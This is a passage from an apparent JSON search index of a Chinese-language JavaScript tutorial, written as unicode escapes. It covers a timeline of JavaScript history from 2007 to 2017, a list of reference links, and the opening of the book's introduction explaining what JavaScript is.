\u8bed\u8a00\u5f00\u59cb\u80fd\u5728\u624b\u673a\u4e2d\u4f7f\u7528\u4e86\uff0c\u610f\u5473\u7740\u6709\u53ef\u80fd\u5199\u51fa\u5728\u684c\u9762\u7535\u8111\u548c\u624b\u673a\u4e2d\u90fd\u80fd\u4f7f\u7528\u7684\u7a0b\u5e8f\u3002 2007\u5e74\uff0cDouglas Crockford \u53d1\u8868\u4e86\u540d\u4e3a\u300aJavaScript: The good parts\u300b\u7684\u6f14\u8bb2\uff0c\u6b21\u5e74\u7531 O'Reilly \u51fa\u7248\u793e\u51fa\u7248\u3002\u8fd9\u6807\u5fd7\u7740\u8f6f\u4ef6\u884c\u4e1a\u5f00\u59cb\u4e25\u8083\u5bf9\u5f85 JavaScript \u8bed\u8a00\uff0c\u5bf9\u5b83\u7684\u8bed\u6cd5\u5f00\u59cb\u91cd\u65b0\u8ba4\u8bc6\u3002 2008\u5e74\uff0cV8 \u7f16\u8bd1\u5668\u8bde\u751f\u3002\u8fd9\u662f Google \u516c\u53f8\u4e3a Chrome \u6d4f\u89c8\u5668\u800c\u5f00\u53d1\u7684\uff0c\u5b83\u7684\u7279\u70b9\u662f\u8ba9 JavaScript \u7684\u8fd0\u884c\u53d8\u5f97\u975e\u5e38\u5feb\u3002\u5b83\u63d0\u9ad8\u4e86 JavaScript \u7684\u6027\u80fd\uff0c\u63a8\u52a8\u4e86\u8bed\u6cd5\u7684\u6539\u8fdb\u548c\u6807\u51c6\u5316\uff0c\u6539\u53d8\u5916\u754c\u5bf9 JavaScript \u7684\u4e0d\u4f73\u5370\u8c61\u3002\u540c\u65f6\uff0cV8 \u662f\u5f00\u6e90\u7684\uff0c\u4efb\u4f55\u4eba\u60f3\u8981\u4e00\u79cd\u5feb\u901f\u7684\u5d4c\u5165\u5f0f\u811a\u672c\u8bed\u8a00\uff0c\u90fd\u53ef\u4ee5\u91c7\u7528 V8\uff0c\u8fd9\u62d3\u5c55\u4e86 JavaScript \u7684\u5e94\u7528\u9886\u57df\u3002 2009\u5e74\uff0cNode.js \u9879\u76ee\u8bde\u751f\uff0c\u521b\u59cb\u4eba\u4e3a Ryan Dahl\uff0c\u5b83\u6807\u5fd7\u7740 JavaScript \u53ef\u4ee5\u7528\u4e8e\u670d\u52a1\u5668\u7aef\u7f16\u7a0b\uff0c\u4ece\u6b64\u7f51\u7ad9\u7684\u524d\u7aef\u548c\u540e\u7aef\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u79cd\u8bed\u8a00\u5f00\u53d1\u3002\u5e76\u4e14\uff0cNode.js \u53ef\u4ee5\u627f\u53d7\u5f88\u5927\u7684\u5e76\u53d1\u6d41\u91cf\uff0c\u4f7f\u5f97\u5f00\u53d1\u67d0\u4e9b\u4e92\u8054\u7f51\u5927\u89c4\u6a21\u7684\u5b9e\u65f6\u5e94\u7528\u53d8\u5f97\u5bb9\u6613\u3002 2009\u5e74\uff0cJeremy Ashkenas \u53d1\u5e03\u4e86 CoffeeScript \u7684\u6700\u521d\u7248\u672c\u3002CoffeeScript \u53ef\u4ee5\u88ab\u8f6c\u6362\u4e3a JavaScript \u8fd0\u884c\uff0c\u4f46\u662f\u8bed\u6cd5\u8981\u6bd4 JavaScript \u7b80\u6d01\u3002\u8fd9\u5f00\u542f\u4e86\u5176\u4ed6\u8bed\u8a00\u8f6c\u4e3a JavaScript \u7684\u98ce\u6f6e\u3002 2009\u5e74\uff0cPhoneGap \u9879\u76ee\u8bde\u751f\uff0c\u5b83\u5c06 HTML5 \u548c JavaScript \u5f15\u5165\u79fb\u52a8\u8bbe\u5907\u7684\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\uff0c\u4e3b\u8981\u9488\u5bf9 iOS \u548c Android \u5e73\u53f0\uff0c\u4f7f\u5f97 JavaScript \u53ef\u4ee5\u7528\u4e8e\u8de8\u5e73\u53f0\u7684\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u3002 2009\uff0cGoogle \u53d1\u5e03 Chrome OS\uff0c\u53f7\u79f0\u662f\u4ee5\u6d4f\u89c8\u5668\u4e3a\u57fa\u7840\u53d1\u5c55\u6210\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5141\u8bb8\u76f4\u63a5\u4f7f\u7528 JavaScript \u7f16\u5199\u5e94\u7528\u7a0b\u5e8f\u3002\u7c7b\u4f3c\u7684\u9879\u76ee\u8fd8\u6709 Mozilla \u7684 Firefox OS\u3002 2010\u5e74\uff0c\u4e09\u4e2a\u91cd\u8981\u7684\u9879\u76ee\u8bde\u751f\uff0c\u5206\u522b\u662f NPM\u3001BackboneJS \u548c RequireJS\uff0c\u6807\u5fd7\u7740 JavaScript \u8fdb\u5165\u6a21\u5757\u5316\u5f00\u53d1\u7684\u65f6\u4ee3\u3002 2011\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 Windows 8\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5c06 JavaScript \u4f5c\u4e3a\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8bed\u8a00\u4e4b\u4e00\uff0c\u76f4\u63a5\u63d0\u4f9b\u7cfb\u7edf\u652f\u6301\u3002 2011\u5e74\uff0cGoogle \u53d1\u5e03\u4e86 Dart \u8bed\u8a00\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u7ed3\u675f JavaScript \u8bed\u8a00\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u5784\u65ad\uff0c\u63d0\u4f9b\u66f4\u5408\u7406\u3001\u66f4\u5f3a\u5927\u7684\u8bed\u6cd5\u548c\u529f\u80fd\u3002Chromium\u6d4f\u89c8\u5668\u6709\u5185\u7f6e\u7684 Dart \u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8fd0\u884c Dart \u7a0b\u5e8f\uff0c\u4f46 Dart \u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u7a0b\u5e8f\u8fd0\u884c\u3002 2011\u5e74\uff0c\u5fae\u8f6f\u5de5\u7a0b\u5e08 Scott Hanselman \u63d0\u51fa\uff0cJavaScript \u5c06\u662f\u4e92\u8054\u7f51\u7684\u6c47\u7f16\u8bed\u8a00\u3002\u56e0\u4e3a\u5b83\u65e0\u6240\u4e0d\u5728\uff0c\u800c\u4e14\u6b63\u5728\u53d8\u5f97\u8d8a\u6765\u8d8a\u5feb\u3002\u5176\u4ed6\u8bed\u8a00\u7684\u7a0b\u5e8f\u53ef\u4ee5\u88ab\u8f6c\u6210 JavaScript \u8bed\u8a00\uff0c\u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002 2012\u5e74\uff0c\u5355\u9875\u9762\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\uff08single-page app framework\uff09\u5f00\u59cb\u5d1b\u8d77\uff0cAngularJS \u9879\u76ee\u548c Ember \u9879\u76ee\u90fd\u53d1\u5e03\u4e861.0\u7248\u672c\u3002 2012\u5e74\uff0c\u5fae\u8f6f\u53d1\u5e03 TypeScript \u8bed\u8a00\u3002\u8be5\u8bed\u8a00\u88ab\u8bbe\u8ba1\u6210 JavaScript \u7684\u8d85\u96c6\uff0c\u8fd9\u610f\u5473\u7740\u6240\u6709 JavaScript \u7a0b\u5e8f\uff0c\u90fd\u53ef\u4ee5\u4e0d\u7ecf\u4fee\u6539\u5730\u5728 TypeScript \u4e2d\u8fd0\u884c\u3002\u540c\u65f6\uff0cTypeScript \u6dfb\u52a0\u4e86\u5f88\u591a\u65b0\u7684\u8bed\u6cd5\u7279\u6027\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u4e3a\u4e86\u5f00\u53d1\u5927\u578b\u7a0b\u5e8f\uff0c\u7136\u540e\u8fd8\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u8fd0\u884c\u3002 2012\u5e74\uff0cMozilla \u57fa\u91d1\u4f1a\u63d0\u51fa asm.js \u89c4\u683c\u3002asm.js \u662f JavaScript \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u6240\u6709\u7b26\u5408 asm.js \u7684\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\uff0c\u5b83\u7684\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u8bed\u6cd5\u6709\u4e25\u683c\u9650\u5b9a\uff0c\u53ef\u4ee5\u88ab\u5feb\u901f\u7f16\u8bd1\u6210\u6027\u80fd\u826f\u597d\u7684\u673a\u5668\u7801\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u7ed9\u5176\u4ed6\u8bed\u8a00\u63d0\u4f9b\u4e00\u4e2a\u7f16\u8bd1\u89c4\u8303\uff0c\u4f7f\u5176\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210\u9ad8\u6548\u7684 JavaScript \u4ee3\u7801\u3002\u540c\u65f6\uff0cMozilla \u57fa\u91d1\u4f1a\u8fd8\u53d1\u8d77\u4e86 Emscripten \u9879\u76ee\uff0c\u76ee\u6807\u5c31\u662f\u63d0\u4f9b\u4e00\u4e2a\u8de8\u8bed\u8a00\u7684\u7f16\u8bd1\u5668\uff0c\u80fd\u591f\u5c06 LLVM \u7684\u4f4d\u4ee3\u7801\uff08bitcode\uff09\u8f6c\u4e3a JavaScript \u4ee3\u7801\uff0c\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002\u56e0\u4e3a\u5927\u90e8\u5206 LLVM \u4f4d\u4ee3\u7801\u90fd\u662f\u4ece C / C++ \u8bed\u8a00\u751f\u6210\u7684\uff0c\u8fd9\u610f\u5473\u7740 C / C++ \u5c06\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002\u6b64\u5916\uff0cMozilla \u65d7\u4e0b\u8fd8\u6709 LLJS \uff08\u5c06 JavaScript \u8f6c\u4e3a C \u4ee3\u7801\uff09\u9879\u76ee\u548c River Trail \uff08\u4e00\u4e2a\u7528\u4e8e\u591a\u6838\u5fc3\u5904\u7406\u5668\u7684 ECMAScript \u6269\u5c55\uff09\u9879\u76ee\u3002\u76ee\u524d\uff0c\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u7684 \u8bed\u8a00\u5217\u8868 \uff0c\u5171\u6709\u5c06\u8fd140\u79cd\u8bed\u8a00\u3002 2013\u5e74\uff0cMozilla \u57fa\u91d1\u4f1a\u53d1\u5e03\u624b\u673a\u64cd\u4f5c\u7cfb\u7edf Firefox OS\uff0c\u8be5\u64cd\u4f5c\u7cfb\u7edf\u7684\u6574\u4e2a\u7528\u6237\u754c\u9762\u90fd\u4f7f\u7528 JavaScript\u3002 2013\u5e74\uff0cECMA \u6b63\u5f0f\u63a8\u51fa JSON \u7684 \u56fd\u9645\u6807\u51c6 \uff0c\u8fd9\u610f\u5473\u7740 JSON \u683c\u5f0f\u5df2\u7ecf\u53d8\u5f97\u4e0e XML \u683c\u5f0f\u4e00\u6837\u91cd\u8981\u548c\u6b63\u5f0f\u4e86\u3002 2013\u5e745\u6708\uff0cFacebook \u53d1\u5e03 UI \u6846\u67b6\u5e93 React\uff0c\u5f15\u5165\u4e86\u65b0\u7684 JSX \u8bed\u6cd5\uff0c\u4f7f\u5f97 UI \u5c42\u53ef\u4ee5\u7528\u7ec4\u4ef6\u5f00\u53d1\uff0c\u540c\u65f6\u5f15\u5165\u4e86\u7f51\u9875\u5e94\u7528\u662f\u72b6\u6001\u673a\u7684\u6982\u5ff5\u3002 2014\u5e74\uff0c\u5fae\u8f6f\u63a8\u51fa JavaScript \u7684 Windows \u5e93 WinJS\uff0c\u6807\u5fd7\u5fae\u8f6f\u516c\u53f8\u5168\u9762\u652f\u6301 JavaScript \u4e0e Windows \u64cd\u4f5c\u7cfb\u7edf\u7684\u878d\u5408\u3002 2014\u5e7411\u6708\uff0c\u7531\u4e8e\u5bf9 Joyent \u516c\u53f8\u5784\u65ad Node \u9879\u76ee\u3001\u4ee5\u53ca\u8be5\u9879\u76ee\u8fdb\u5c55\u7f13\u6162\u7684\u4e0d\u6ee1\uff0c\u4e00\u90e8\u5206\u6838\u5fc3\u5f00\u53d1\u8005\u79bb\u5f00\u4e86 Node.js\uff0c\u521b\u9020\u4e86 io.js \u9879\u76ee\uff0c\u8fd9\u662f\u4e00\u4e2a\u66f4\u5f00\u653e\u3001\u66f4\u65b0\u66f4\u9891\u7e41\u7684 Node.js \u7248\u672c\uff0c\u5f88\u77ed\u65f6\u95f4\u5185\u5c31\u53d1\u5e03\u5230\u4e862.0\u7248\u3002\u4e09\u4e2a\u6708\u540e\uff0cJoyent \u516c\u53f8\u5ba3\u5e03\u653e\u5f03\u5bf9 Node \u9879\u76ee\u7684\u63a7\u5236\uff0c\u5c06\u5176\u8f6c\u4ea4\u7ed9\u65b0\u6210\u7acb\u7684\u5f00\u653e\u6027\u8d28\u7684 Node \u57fa\u91d1\u4f1a\u3002\u968f\u540e\uff0cio.js \u9879\u76ee\u5ba3\u5e03\u56de\u5f52 Node\uff0c\u4e24\u4e2a\u7248\u672c\u5c06\u5408\u5e76\u3002 2015\u5e743\u6708\uff0cFacebook \u516c\u53f8\u53d1\u5e03\u4e86 React Native \u9879\u76ee\uff0c\u5c06 React \u6846\u67b6\u79fb\u690d\u5230\u4e86\u624b\u673a\u7aef\uff0c\u53ef\u4ee5\u7528\u6765\u5f00\u53d1\u624b\u673a App\u3002\u5b83\u4f1a\u5c06 JavaScript \u4ee3\u7801\u8f6c\u4e3a iOS \u5e73\u53f0\u7684 Objective-C \u4ee3\u7801\uff0c\u6216\u8005 Android \u5e73\u53f0\u7684 Java \u4ee3\u7801\uff0c\u4ece\u800c\u4e3a JavaScript \u8bed\u8a00\u5f00\u53d1\u9ad8\u6027\u80fd\u7684\u539f\u751f App \u6253\u5f00\u4e86\u4e00\u6761\u9053\u8def\u3002 2015\u5e744\u6708\uff0cAngular \u6846\u67b6\u5ba3\u5e03\uff0c2.0 \u7248\u5c06\u57fa\u4e8e\u5fae\u8f6f\u516c\u53f8\u7684TypeScript\u8bed\u8a00\u5f00\u53d1\uff0c\u8fd9\u7b49\u4e8e\u4e3a JavaScript \u8bed\u8a00\u5f15\u5165\u4e86\u5f3a\u7c7b\u578b\u3002 2015\u5e745\u6708\uff0cNode \u6a21\u5757\u7ba1\u7406\u5668 NPM \u8d85\u8d8a CPAN\uff0c\u6807\u5fd7\u7740 JavaScript \u6210\u4e3a\u4e16\u754c\u4e0a\u8f6f\u4ef6\u6a21\u5757\u6700\u591a\u7684\u8bed\u8a00\u3002 2015\u5e745\u6708\uff0cGoogle \u516c\u53f8\u7684 Polymer \u6846\u67b6\u53d1\u5e031.0\u7248\u3002\u8be5\u9879\u76ee\u7684\u76ee\u6807\u662f\u751f\u4ea7\u73af\u5883\u53ef\u4ee5\u4f7f\u7528 WebComponent \u7ec4\u4ef6\uff0c\u5982\u679c\u80fd\u591f\u8fbe\u5230\u76ee\u6807\uff0cWeb \u5f00\u53d1\u5c06\u8fdb\u5165\u4e00\u4e2a\u5168\u65b0\u7684\u4ee5\u7ec4\u4ef6\u4e3a\u5f00\u53d1\u57fa\u7840\u7684\u9636\u6bb5\u3002 2015\u5e746\u6708\uff0cECMA \u6807\u51c6\u5316\u7ec4\u7ec7\u6b63\u5f0f\u6279\u51c6\u4e86 ECMAScript 6 \u8bed\u8a00\u6807\u51c6\uff0c\u5b9a\u540d\u4e3a\u300aECMAScript 2015 \u6807\u51c6\u300b\u3002JavaScript \u8bed\u8a00\u6b63\u5f0f\u8fdb\u5165\u4e86\u4e0b\u4e00\u4e2a\u9636\u6bb5\uff0c\u6210\u4e3a\u4e00\u79cd\u4f01\u4e1a\u7ea7\u7684\u3001\u5f00\u53d1\u5927\u89c4\u6a21\u5e94\u7528\u7684\u8bed\u8a00\u3002\u8fd9\u4e2a\u6807\u51c6\u4ece\u63d0\u51fa\u5230\u6279\u51c6\uff0c\u5386\u65f610\u5e74\uff0c\u800c JavaScript \u8bed\u8a00\u4ece\u8bde\u751f\u81f3\u4eca\u4e5f\u5df2\u7ecf20\u5e74\u4e86\u3002 2015\u5e746\u6708\uff0cMozilla \u5728 asm.js \u7684\u57fa\u7840\u4e0a\u53d1\u5e03 WebAssembly \u9879\u76ee\u3002\u8fd9\u662f\u4e00\u79cd JavaScript \u5f15\u64ce\u7684\u4e2d\u95f4\u7801\u683c\u5f0f\uff0c\u5168\u90e8\u90fd\u662f\u4e8c\u8fdb\u5236\uff0c\u7c7b\u4f3c\u4e8e Java \u7684\u5b57\u8282\u7801\uff0c\u6709\u5229\u4e8e\u79fb\u52a8\u8bbe\u5907\u52a0\u8f7d JavaScript \u811a\u672c\uff0c\u6267\u884c\u901f\u5ea6\u63d0\u9ad8\u4e86 20+ \u500d\u3002\u8fd9\u610f\u5473\u7740\u5c06\u6765\u7684\u8f6f\u4ef6\uff0c\u4f1a\u53d1\u5e03 JavaScript \u4e8c\u8fdb\u5236\u5305\u3002 2016\u5e746\u6708\uff0c\u300aECMAScript 2016 \u6807\u51c6\u300b\u53d1\u5e03\u3002\u4e0e\u524d\u4e00\u5e74\u53d1\u5e03\u7684\u7248\u672c\u76f8\u6bd4\uff0c\u5b83\u53ea\u589e\u52a0\u4e86\u4e24\u4e2a\u8f83\u5c0f\u7684\u7279\u6027\u3002 2017\u5e746\u6708\uff0c\u300aECMAScript 2017 \u6807\u51c6\u300b\u53d1\u5e03\uff0c\u6b63\u5f0f\u5f15\u5165\u4e86 async \u51fd\u6570\uff0c\u4f7f\u5f97\u5f02\u6b65\u64cd\u4f5c\u7684\u5199\u6cd5\u51fa\u73b0\u4e86\u6839\u672c\u7684\u53d8\u5316\u3002 2017\u5e7411\u6708\uff0c\u6240\u6709\u4e3b\u6d41\u6d4f\u89c8\u5668\u5168\u90e8\u652f\u6301 WebAssembly\uff0c\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u8bed\u8a00\u90fd\u53ef\u4ee5\u7f16\u8bd1\u6210 JavaScript\uff0c\u5728\u6d4f\u89c8\u5668\u8fd0\u884c\u3002","title":"\u5468\u8fb9\u5927\u4e8b\u8bb0"},{"location":"basic/history/#_3","text":"Axel Rauschmayer, The Past, Present, and Future of JavaScript John Dalziel, The race for speed part 4: The future for JavaScript Axel Rauschmayer, Basic JavaScript for the impatient programmer resin.io, Happy 18 th Birthday JavaScript! A look at an unlikely past and bright future","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"basic/introduction/","text":"\u5bfc\u8bba \u00b6 \u4ec0\u4e48\u662f JavaScript \u8bed\u8a00\uff1f \u00b6 JavaScript \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684\u811a\u672c\u8bed\u8a00\u3002\u6240\u8c13\u201c\u811a\u672c\u8bed\u8a00\u201d\uff08script language\uff09\uff0c\u6307\u7684\u662f\u5b83\u4e0d\u5177\u5907\u5f00\u53d1\u64cd\u4f5c\u7cfb\u7edf\u7684\u80fd\u529b\uff0c\u800c\u662f\u53ea\u7528\u6765\u7f16\u5199\u63a7\u5236\u5176\u4ed6\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6d4f\u89c8\u5668\uff09\u7684\u201c\u811a\u672c\u201d\u3002 JavaScript \u4e5f\u662f\u4e00\u79cd\u5d4c\u5165\u5f0f\uff08embedded\uff09\u8bed\u8a00\u3002\u5b83\u672c\u8eab\u63d0\u4f9b\u7684\u6838\u5fc3\u8bed\u6cd5\u4e0d\u7b97\u5f88\u591a\uff0c\u53ea\u80fd\u7528\u6765\u505a\u4e00\u4e9b\u6570\u5b66\u548c\u903b\u8f91\u8fd0\u7b97\u3002JavaScript \u672c\u8eab\u4e0d\u63d0\u4f9b\u4efb\u4f55\u4e0e I/O\uff08\u8f93\u5165/\u8f93\u51fa\uff09\u76f8\u5173\u7684 API\uff0c\u90fd\u8981\u9760\u5bbf\u4e3b\u73af\u5883\uff08host\uff09\u63d0\u4f9b\uff0c\u6240\u4ee5 JavaScript \u53ea\u5408\u9002\u5d4c\u5165\u66f4\u5927\u578b\u7684\u5e94\u7528\u7a0b\u5e8f\u73af\u5883\uff0c\u53bb\u8c03\u7528\u5bbf\u4e3b\u73af\u5883\u63d0\u4f9b\u7684\u5e95\u5c42 API\u3002 \u76ee\u524d\uff0c\u5df2\u7ecf\u5d4c\u5165 JavaScript \u7684\u5bbf\u4e3b\u73af\u5883\u6709\u591a\u79cd\uff0c\u6700\u5e38\u89c1\u7684\u73af\u5883\u5c31\u662f\u6d4f\u89c8\u5668\uff0c\u53e6\u5916\u8fd8\u6709\u670d\u52a1\u5668\u73af\u5883\uff0c\u4e5f\u5c31\u662f Node \u9879\u76ee\u3002 \u4ece\u8bed\u6cd5\u89d2\u5ea6\u770b\uff0cJavaScript \u8bed\u8a00\u662f\u4e00\u79cd\u201c\u5bf9\u8c61\u6a21\u578b\u201d\u8bed\u8a00\u3002\u5404\u79cd\u5bbf\u4e3b\u73af\u5883\u901a\u8fc7\u8fd9\u4e2a\u6a21\u578b\uff0c\u63cf\u8ff0\u81ea\u5df1\u7684\u529f\u80fd\u548c\u64cd\u4f5c\u63a5\u53e3\uff0c\u4ece\u800c\u901a\u8fc7 JavaScript \u63a7\u5236\u8fd9\u4e9b\u529f\u80fd\u3002\u4f46\u662f\uff0cJavaScript \u5e76\u4e0d\u662f\u7eaf\u7cb9\u7684\u201c\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u201d\uff0c\u8fd8\u652f\u6301\u5176\u4ed6\u7f16\u7a0b\u8303\u5f0f\uff08\u6bd4\u5982\u51fd\u6570\u5f0f\u7f16\u7a0b\uff09\u3002\u8fd9\u5bfc\u81f4\u51e0\u4e4e\u4efb\u4f55\u4e00\u4e2a\u95ee\u9898\uff0cJavaScript \u90fd\u6709\u591a\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002\u9605\u8bfb\u672c\u4e66\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u4f1a\u8be7\u5f02\u4e8e JavaScript \u8bed\u6cd5\u7684\u7075\u6d3b\u6027\u3002 JavaScript \u7684\u6838\u5fc3\u8bed\u6cd5\u90e8\u5206\u76f8\u5f53\u7cbe\u7b80\uff0c\u53ea\u5305\u62ec\u4e24\u4e2a\u90e8\u5206\uff1a\u57fa\u672c\u7684\u8bed\u6cd5\u6784\u9020\uff08\u6bd4\u5982\u64cd\u4f5c\u7b26\u3001\u63a7\u5236\u7ed3\u6784\u3001\u8bed\u53e5\uff09\u548c\u6807\u51c6\u5e93\uff08\u5c31\u662f\u4e00\u7cfb\u5217\u5177\u6709\u5404\u79cd\u529f\u80fd\u7684\u5bf9\u8c61\u6bd4\u5982 Array \u3001 Date \u3001 Math \u7b49\uff09\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u79cd\u5bbf\u4e3b\u73af\u5883\u63d0\u4f9b\u989d\u5916\u7684 API\uff08\u5373\u53ea\u80fd\u5728\u8be5\u73af\u5883\u4f7f\u7528\u7684\u63a5\u53e3\uff09\uff0c\u4ee5\u4fbf JavaScript \u8c03\u7528\u3002\u4ee5\u6d4f\u89c8\u5668\u4e3a\u4f8b\uff0c\u5b83\u63d0\u4f9b\u7684\u989d\u5916 API \u53ef\u4ee5\u5206\u6210\u4e09\u5927\u7c7b\u3002 \u6d4f\u89c8\u5668\u63a7\u5236\u7c7b\uff1a\u64cd\u4f5c\u6d4f\u89c8\u5668 DOM \u7c7b\uff1a\u64cd\u4f5c\u7f51\u9875\u7684\u5404\u79cd\u5143\u7d20 Web \u7c7b\uff1a\u5b9e\u73b0\u4e92\u8054\u7f51\u7684\u5404\u79cd\u529f\u80fd \u5982\u679c\u5bbf\u4e3b\u73af\u5883\u662f\u670d\u52a1\u5668\uff0c\u5219\u4f1a\u63d0\u4f9b\u5404\u79cd\u64cd\u4f5c\u7cfb\u7edf\u7684 API\uff0c\u6bd4\u5982\u6587\u4ef6\u64cd\u4f5c API\u3001\u7f51\u7edc\u901a\u4fe1 API\u7b49\u7b49\u3002\u8fd9\u4e9b\u4f60\u90fd\u53ef\u4ee5\u5728 Node \u73af\u5883\u4e2d\u627e\u5230\u3002 \u672c\u4e66\u4e3b\u8981\u4ecb\u7ecd JavaScript \u6838\u5fc3\u8bed\u6cd5\u548c\u6d4f\u89c8\u5668\u7f51\u9875\u5f00\u53d1\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u4e0d\u6d89\u53ca Node\u3002\u5168\u4e66\u53ef\u4ee5\u5206\u6210\u4ee5\u4e0b\u56db\u5927\u90e8\u5206\u3002 \u57fa\u672c\u8bed\u6cd5 \u6807\u51c6\u5e93 \u6d4f\u89c8\u5668 API DOM JavaScript \u8bed\u8a00\u6709\u591a\u4e2a\u7248\u672c\u3002\u672c\u4e66\u7684\u5185\u5bb9\u4e3b\u8981\u57fa\u4e8e ECMAScript 5.1 \u7248\u672c\uff0c\u8fd9\u662f\u5b66\u4e60 JavaScript \u8bed\u6cd5\u7684\u57fa\u7840\u3002ES6 \u548c\u66f4\u65b0\u7684\u8bed\u6cd5\u8bf7\u53c2\u8003\u6211\u5199\u7684 \u300aECMAScript 6\u5165\u95e8\u300b \u3002 \u4e3a\u4ec0\u4e48\u5b66\u4e60 JavaScript\uff1f \u00b6 JavaScript \u8bed\u8a00\u6709\u4e00\u4e9b\u663e\u8457\u7279\u70b9\uff0c\u4f7f\u5f97\u5b83\u975e\u5e38\u503c\u5f97\u5b66\u4e60\u3002\u5b83\u65e2\u9002\u5408\u4f5c\u4e3a\u5b66\u4e60\u7f16\u7a0b\u7684\u5165\u95e8\u8bed\u8a00\uff0c\u4e5f\u9002\u5408\u5f53\u4f5c\u65e5\u5e38\u5f00\u53d1\u7684\u5de5\u4f5c\u8bed\u8a00\u3002\u5b83\u662f\u76ee\u524d\u6700\u6709\u5e0c\u671b\u3001\u524d\u9014\u6700\u5149\u660e\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u4e4b\u4e00\u3002 \u64cd\u63a7\u6d4f\u89c8\u5668\u7684\u80fd\u529b \u00b6 JavaScript \u7684\u53d1\u660e\u76ee\u7684\uff0c\u5c31\u662f\u4f5c\u4e3a\u6d4f\u89c8\u5668\u7684\u5185\u7f6e\u811a\u672c\u8bed\u8a00\uff0c\u4e3a\u7f51\u9875\u5f00\u53d1\u8005\u63d0\u4f9b\u64cd\u63a7\u6d4f\u89c8\u5668\u7684\u80fd\u529b\u3002\u5b83\u662f\u76ee\u524d\u552f\u4e00\u4e00\u79cd\u901a\u7528\u7684\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u3002\u5b83\u53ef\u4ee5\u8ba9\u7f51\u9875\u5448\u73b0\u5404\u79cd\u7279\u6b8a\u6548\u679c\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u826f\u597d\u7684\u4e92\u52a8\u4f53\u9a8c\u3002 \u76ee\u524d\uff0c\u5168\u4e16\u754c\u51e0\u4e4e\u6240\u6709\u7f51\u9875\u90fd\u4f7f\u7528 JavaScript\u3002\u5982\u679c\u4e0d\u7528\uff0c\u7f51\u7ad9\u7684\u6613\u7528\u6027\u548c\u4f7f\u7528\u6548\u7387\u5c06\u5927\u6253\u6298\u6263\uff0c\u65e0\u6cd5\u6210\u4e3a\u64cd\u4f5c\u4fbf\u5229\u3001\u5bf9\u7528\u6237\u53cb\u597d\u7684\u7f51\u7ad9\u3002 \u5bf9\u4e8e\u4e00\u4e2a\u4e92\u8054\u7f51\u5f00\u53d1\u8005\u6765\u8bf4\uff0c\u5982\u679c\u4f60\u60f3\u63d0\u4f9b\u6f02\u4eae\u7684\u7f51\u9875\u3001\u4ee4\u7528\u6237\u6ee1\u610f\u7684\u4e0a\u7f51\u4f53\u9a8c\u3001\u5404\u79cd\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u4fbf\u6377\u529f\u80fd\u3001\u524d\u540e\u7aef\u4e4b\u95f4\u7d27\u5bc6\u9ad8\u6548\u7684\u8054\u7cfb\uff0cJavaScript \u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5de5\u5177\u3002 \u5e7f\u6cdb\u7684\u4f7f\u7528\u9886\u57df \u00b6 \u8fd1\u5e74\u6765\uff0cJavaScript \u7684\u4f7f\u7528\u8303\u56f4\uff0c\u6162\u6162\u8d85\u8d8a\u4e86\u6d4f\u89c8\u5668\uff0c\u6b63\u5728\u5411\u901a\u7528\u7684\u7cfb\u7edf\u8bed\u8a00\u53d1\u5c55\u3002 \uff081\uff09\u6d4f\u89c8\u5668\u7684\u5e73\u53f0\u5316 \u968f\u7740 HTML5 \u7684\u51fa\u73b0\uff0c\u6d4f\u89c8\u5668\u672c\u8eab\u7684\u529f\u80fd\u8d8a\u6765\u8d8a\u5f3a\uff0c\u4e0d\u518d\u4ec5\u4ec5\u80fd\u6d4f\u89c8\u7f51\u9875\uff0c\u800c\u662f\u8d8a\u6765\u8d8a\u50cf\u4e00\u4e2a\u5e73\u53f0\uff0cJavaScript \u56e0\u6b64\u5f97\u4ee5\u8c03\u7528\u8bb8\u591a\u7cfb\u7edf\u529f\u80fd\uff0c\u6bd4\u5982\u64cd\u4f5c\u672c\u5730\u6587\u4ef6\u3001\u64cd\u4f5c\u56fe\u7247\u3001\u8c03\u7528\u6444\u50cf\u5934\u548c\u9ea6\u514b\u98ce\u7b49\u7b49\u3002\u8fd9\u4f7f\u5f97 JavaScript 